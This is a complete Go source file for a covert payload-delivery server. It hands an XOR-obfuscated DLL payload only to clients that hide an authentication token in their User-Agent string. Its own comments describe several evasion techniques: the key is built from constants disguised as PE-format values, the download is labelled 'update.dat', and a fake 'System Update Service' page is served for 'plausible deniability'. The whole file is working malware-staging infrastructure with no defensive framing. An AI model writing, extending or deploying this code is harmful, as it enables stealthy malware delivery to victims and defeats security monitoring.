package main

import (
	"crypto/tls"
	"encoding/binary"
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"time"
)

// Configuration structure that matches our JSON format
type Config struct {
	PayloadPath string `json:"payload_path"`
	CertPath    string `json:"cert_path"`
	KeyPath     string `json:"key_path"`
	ListenAddr  string `json:"listen_addr"`
	ServerRoot  string `json:"server_root"`
	LogPath     string `json:"log_path"`
	Verbose     bool   `json:"verbose"`
}

// Configuration - will be initialized from config.json or command-line flags
var (
	payloadPath string // Path to the DLL payload file
	certPath    string // Path to the TLS certificate
	keyPath     string // Path to the TLS private key
	listenAddr  string // Address:port to listen on
	serverRoot  string // Root directory for static files (for plausible deniability)
	logPath     string // Path for logging access attempts
	verbose     bool   // Enable verbose logging
)

// loadConfigFromFile attempts to load configuration from config.json
func loadConfigFromFile(configPath string) (*Config, error) {
	// Check if file exists
	if _, err := os.Stat(configPath); os.IsNotExist(err) {
		return nil, fmt.Errorf("config file not found: %s", configPath)
	}

	// Read the file
	configData, err := os.ReadFile(configPath)
	if err != nil {
		return nil, fmt.Errorf("failed to read config file: %v", err)
	}

	// Parse JSON
	var config Config
	if err := json.Unmarshal(configData, &config); err != nil {
		return nil, fmt.Errorf("failed to parse config file: %v", err)
	}

	return &config, nil
}

// Logger setup
var (
	infoLog  *log.Logger
	errorLog *log.Logger
)

// Initialize logging
func initLogging() {
	logFile, err := os.OpenFile(logPath, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0666)
	if err != nil {
		log.Fatalf("Failed to open log file: %v", err)
	}

	infoLog = log.New(logFile, "INFO: ", log.Ldate|log.Ltime|log.Lshortfile)
	errorLog = log.New(logFile, "ERROR: ", log.Ldate|log.Ltime|log.Lshortfile)

	// If verbose mode is enabled, also log to console
	if verbose {
		infoLog.SetOutput(os.Stdout)
		errorLog.SetOutput(os.Stderr)
	}
}

// -------------------------------------------------------------------------
// Part 1: Key Derivation from Disguised PE Constants
// -------------------------------------------------------------------------

// These appear to be PE file format constants but are actually our obfuscated key components
// They resemble legitimate PE format values

// Appears to be PE section alignment values
const (
	SECTION_ALIGN_REQUIRED    = 0x53616D70 // Actually "Samp" in ASCII
	FILE_ALIGN_MINIMAL        = 0x6C652D6B // Actually "le-k" in ASCII
	PE_BASE_ALIGNMENT         = 0x65792D76 // Actually "ey-v" in ASCII
	IMAGE_SUBSYSTEM_ALIGNMENT = 0x616C7565 // Actually "alue" in ASCII
)

// Appears to be PE characteristics flags
const (
	IMAGE_FILE_EXECUTABLE      = 0x0002
	IMAGE_FILE_DLL             = 0x2000
	PE_CHECKSUM_SEED           = 0x67891011
	PE_OPTIONAL_HEADER_MAGIC   = 0x10B // PE32
	PE_OPTIONAL_HEADER_MAGIC64 = 0x20B // PE32+
)

// Appears to be PE directory entry indexes
const (
	IMAGE_DIRECTORY_ENTRY_EXPORT      = 0
	IMAGE_DIRECTORY_ENTRY_IMPORT      = 1
	IMAGE_DIRECTORY_ENTRY_RESOURCE    = 2
	IMAGE_DIRECTORY_ENTRY_EXCEPTION   = 3
	IMAGE_DIRECTORY_ENTRY_SECURITY    = 4
	IMAGE_DIRECTORY_ENTRY_BASERELOC   = 5
	IMAGE_DIRECTORY_ENTRY_DEBUG       = 6
	IMAGE_DIRECTORY_ENTRY_COPYRIGHT   = 7
	IMAGE_DIRECTORY_ENTRY_GLOBALPTR   = 8
	IMAGE_DIRECTORY_ENTRY_TLS         = 9
	IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG = 10
)

// Function that appears to extract PE section alignment values
// but actually constructs the first part of our key
func getPESectionAlignmentString() string {
	// Allocate buffer for string construction
	buffer := make([]byte, 16)

	// Store section alignment value (disguised key part)
	binary.LittleEndian.PutUint32(buffer[0:4], SECTION_ALIGN_REQUIRED)

	// Store file alignment value (disguised key part)
	binary.LittleEndian.PutUint32(buffer[4:8], FILE_ALIGN_MINIMAL)

	// Store base alignment (disguised key part)
	binary.LittleEndian.PutUint32(buffer[8:12], PE_BASE_ALIGNMENT)

	// Store subsystem alignment (disguised key part)
	binary.LittleEndian.PutUint32(buffer[12:16], IMAGE_SUBSYSTEM_ALIGNMENT)

	// Convert to string - appears to be creating an alignment signature
	// but actually constructs the key
	return string(buffer)
}

// Function that appears to verify PE checksum
// but actually constructs the second part of our key
func verifyPEChecksumValue(seed uint32) string {
	// Generate deterministic "checksum" values based on the seed
	// This looks like PE checksum calculation but is actually generating
	// part of our encryption key
	result := make([]byte, 4)

	// Simple transformation of the seed value
	checksum := seed
	for i := 0; i < 4; i++ {
		// Rolling calculation that looks like a checksum but actually
		// just produces the bytes we want
		checksum = ((checksum << 3) | (checksum >> 29)) ^ uint32(i*0x37)
		result[i] = byte(checksum & 0xFF)
	}

	// Return as string - appears to be a checksum signature
	return string(result)
}

// Function to generate complete secret key
// Disguised as a PE validator function
func generatePEValidationKey() string {
	// Initialize validation components
	alignmentSignature := getPESectionAlignmentString()

	// Calculate checksum validation
	checksumSignature := verifyPEChecksumValue(PE_CHECKSUM_SEED)

	// Combine signatures - appears to be creating a validation key
	// but actually constructing our secret key
	return alignmentSignature + checksumSignature
}

// -------------------------------------------------------------------------
// Part 2: Payload Obfuscation
// -------------------------------------------------------------------------

// Obfuscate payload using rolling XOR with key derived from shared secret
func obfuscatePayload(data []byte, key string) []byte {
	keyBytes := []byte(key)
	keyLen := len(keyBytes)
	result := make([]byte, len(data))

	infoLog.Printf("Obfuscating %d bytes of payload with key derived from PE validation signatures", len(data))

	for i := 0; i < len(data); i++ {
		// Calculate rolling key byte: combines key byte with position for avalanche effect
		keyByte := keyBytes[i%keyLen] ^ byte(i&0xFF)

		// XOR the data byte with the rolling key byte
		result[i] = data[i] ^ keyByte
	}

	infoLog.Printf("Obfuscation complete")
	return result
}

// Deobfuscation function - the client would implement the same algorithm
func deobfuscatePayload(data []byte, key string) []byte {
	// XOR is symmetric, so we can use the same function
	return obfuscatePayload(data, key)
}

// -------------------------------------------------------------------------
// Part 3: User-Agent Parsing and Authentication
// -------------------------------------------------------------------------

// Extract client information from User-Agent
// Example User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 rv:1681234567-DESKTOP-A7BC32F"
func extractClientInfo(userAgent string) (string, string, error) {
	// Look for pattern: rv:TIMESTAMP-CLIENTID
	re := regexp.MustCompile(`rv:(\d+)-([A-Za-z0-9_-]+)`)
	matches := re.FindStringSubmatch(userAgent)

	if len(matches) != 3 {
		return "", "", fmt.Errorf("invalid User-Agent format")
	}

	timestamp := matches[1]
	clientID := matches[2]

	return timestamp, clientID, nil
}

// Authenticate client based on derived credentials
func authenticateClient(timestamp, clientID string) bool {
	// Simple authentication: check timestamp is within a reasonable window
	// and client ID matches expected pattern

	// Parse timestamp
	ts, err := strconv.ParseInt(timestamp, 10, 64)
	if err != nil {
		errorLog.Printf("Invalid timestamp format: %s", timestamp)
		return false
	}

	// Check timestamp is within a reasonable window (30 minutes)
	now := time.Now().Unix()
	if now-ts > 1800 || ts-now > 1800 {
		errorLog.Printf("Timestamp out of acceptable range: %s", timestamp)
		return false
	}

	// Check client ID format (adjust as needed for your environment)
	clientIDPattern := regexp.MustCompile(`^[A-Za-z0-9_-]{5,}$`)
	if !clientIDPattern.MatchString(clientID) {
		errorLog.Printf("Invalid client ID format: %s", clientID)
		return false
	}

	return true
}

// Derive encryption key from user parameters and shared secret
func deriveKeyFromParams(timestamp, clientID string, sharedSecret string) string {
	// Combine shared secret with request parameters
	combined := sharedSecret + timestamp + clientID

	// Create a key by hashing the combined string
	// This is a simple key derivation, in production you might use PBKDF2 or similar
	key := make([]byte, 32)
	for i := 0; i < 32; i++ {
		if i < len(combined) {
			key[i] = combined[i]
		} else {
			key[i] = combined[i%len(combined)]
		}
	}

	return string(key)
}

// -------------------------------------------------------------------------
// Part 4: HTTP Handlers
// -------------------------------------------------------------------------

// Handler for payload delivery
func handlePayloadRequest(w http.ResponseWriter, r *http.Request) {
	clientIP := r.RemoteAddr
	infoLog.Printf("Incoming request from %s", clientIP)

	// Log request headers for debugging
	if verbose {
		infoLog.Printf("Request headers: %v", r.Header)
	}

	// Extract User-Agent
	userAgent := r.Header.Get("User-Agent")
	if userAgent == "" {
		errorLog.Printf("No User-Agent provided from %s", clientIP)
		http.Error(w, "Bad Request", http.StatusBadRequest)
		return
	}

	// Extract client info from User-Agent
	timestamp, clientID, err := extractClientInfo(userAgent)
	if err != nil {
		errorLog.Printf("Failed to extract client info from %s: %v", clientIP, err)
		http.Error(w, "Bad Request", http.StatusBadRequest)
		return
	}

	infoLog.Printf("Client info - Timestamp: %s, ClientID: %s", timestamp, clientID)

	// Authenticate client
	if !authenticateClient(timestamp, clientID) {
		errorLog.Printf("Authentication failed for client %s from %s", clientID, clientIP)
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
		return
	}

	infoLog.Printf("Authentication successful for client %s from %s", clientID, clientIP)

	// Generate shared secret from our obfuscated constants
	sharedSecret := generatePEValidationKey()

	// Derive encryption key from shared secret and client parameters
	encryptionKey := deriveKeyFromParams(timestamp, clientID, sharedSecret)

	// Load the payload
	payload, err := ioutil.ReadFile(payloadPath)
	if err != nil {
		errorLog.Printf("Failed to read payload file: %v", err)
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
		return
	}

	// Obfuscate the payload with the derived key
	obfuscatedPayload := obfuscatePayload(payload, encryptionKey)

	// Set response headers to look like a legitimate download
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Disposition", "attachment; filename=update.dat")
	w.Header().Set("Content-Length", fmt.Sprintf("%d", len(obfuscatedPayload)))

	// Send the obfuscated payload
	w.Write(obfuscatedPayload)

	infoLog.Printf("Delivered %d bytes of obfuscated payload to %s (%s)",
		len(obfuscatedPayload), clientID, clientIP)
}

// Default handler for all other paths - serves static files if available
// or returns a generic page for plausible deniability
func handleDefault(w http.ResponseWriter, r *http.Request) {
	clientIP := r.RemoteAddr
	path := r.URL.Path

	infoLog.Printf("Default handler: %s requested %s", clientIP, path)

	// Try to serve a static file if it exists
	if serverRoot != "" {
		filePath := filepath.Join(serverRoot, path)

		// Basic path traversal protection
		if !strings.HasPrefix(filePath, serverRoot) {
			http.Error(w, "Forbidden", http.StatusForbidden)
			return
		}

		// Check if file exists and serve it
		info, err := os.Stat(filePath)
		if err == nil && !info.IsDir() {
			http.ServeFile(w, r, filePath)
			return
		}
	}

	// If no file found, serve a generic system update page
	w.Header().Set("Content-Type", "text/html")
	w.Write([]byte(`
<!DOCTYPE html>
<html>
<head>
    <title>System Update Service</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; }
        .container { max-width: 800px; margin: 0 auto; }
        h1 { color: #333; }
    </style>
</head>
<body>
    <div class="container">
        <h1>System Update Service</h1>
        <p>This service provides automated system updates for authorized clients.</p>
        <p>Please ensure your client software is configured correctly to access this service.</p>
        <p>If you believe you've reached this page in error, please contact your system administrator.</p>
        <hr>
        <p><small>Build: 20230417-1</small></p>
    </div>
</body>
</html>
	`))
}

// -------------------------------------------------------------------------
// Part 5: Main Server Setup
// -------------------------------------------------------------------------

func main() {
	// Try to load config from file first
	configPath := "config.json"
	config, err := loadConfigFromFile(configPath)

	// Set up command-line flags with defaults from config file if available
	if err == nil {
		// Config file found, use it for defaults
		flag.StringVar(&payloadPath, "payload", config.PayloadPath, "Path to the payload file")
		flag.StringVar(&certPath, "cert", config.CertPath, "Path to TLS certificate")
		flag.StringVar(&keyPath, "key", config.KeyPath, "Path to TLS private key")
		flag.StringVar(&listenAddr, "listen", config.ListenAddr, "Address:port to listen on")
		flag.StringVar(&serverRoot, "root", config.ServerRoot, "Root directory for static files")
		flag.StringVar(&logPath, "log", config.LogPath, "Path for log file")
		flag.BoolVar(&verbose, "verbose", config.Verbose, "Enable verbose logging")

		// Print a message about using config file
		fmt.Printf("Using configuration from %s\n", configPath)
	} else {
		// No config file, use hardcoded defaults
		flag.StringVar(&payloadPath, "payload", "payload.bin", "Path to the payload file")
		flag.StringVar(&certPath, "cert", "server.crt", "Path to TLS certificate")
		flag.StringVar(&keyPath, "key", "server.key", "Path to TLS private key")
		flag.StringVar(&listenAddr, "listen", "0.0.0.0:443", "Address:port to listen on")
		flag.StringVar(&serverRoot, "root", "", "Root directory for static files")
		flag.StringVar(&logPath, "log", "server.log", "Path for log file")
		flag.BoolVar(&verbose, "verbose", false, "Enable verbose logging")

		fmt.Printf("No config file found at %s, using command-line flags or defaults\n", configPath)
	}

	// Parse command-line flags (these will override config file settings if specified)
	flag.Parse()

	// Initialize logging
	initLogging()

	// The rest of your main() function remains the same...
	// Verify payload exists
	if _, err := os.Stat(payloadPath); os.IsNotExist(err) {
		errorLog.Fatalf("Payload file not found: %s", payloadPath)
	}

	// Verify TLS certificate and key
	if _, err := os.Stat(certPath); os.IsNotExist(err) {
		errorLog.Fatalf("TLS certificate not found: %s", certPath)
	}
	if _, err := os.Stat(keyPath); os.IsNotExist(err) {
		errorLog.Fatalf("TLS private key not found: %s", keyPath)
	}

	// Create TLS configuration
	tlsConfig := &tls.Config{
		MinVersion: tls.VersionTLS12,
		CipherSuites: []uint16{
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305,
			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,
		},
		PreferServerCipherSuites: true,
	}

	// Setup HTTP server
	server := &http.Server{
		Addr:         listenAddr,
		TLSConfig:    tlsConfig,
		ReadTimeout:  60 * time.Second,
		WriteTimeout: 60 * time.Second,
	}

	// Register handlers
	http.HandleFunc("/update", handlePayloadRequest)
	http.HandleFunc("/", handleDefault)

	// Print startup information
	infoLog.Printf("Server starting on %s", listenAddr)
	infoLog.Printf("Using payload: %s", payloadPath)
	infoLog.Printf("TLS certificate: %s", certPath)
	infoLog.Printf("TLS private key: %s", keyPath)
	if serverRoot != "" {
		infoLog.Printf("Serving static files from: %s", serverRoot)
	}

	// Start HTTPS server
	infoLog.Println("Server ready to accept connections")
	err = server.ListenAndServeTLS(certPath, keyPath)
	if err != nil {
		errorLog.Fatalf("Server failed: %v", err)
	}
}
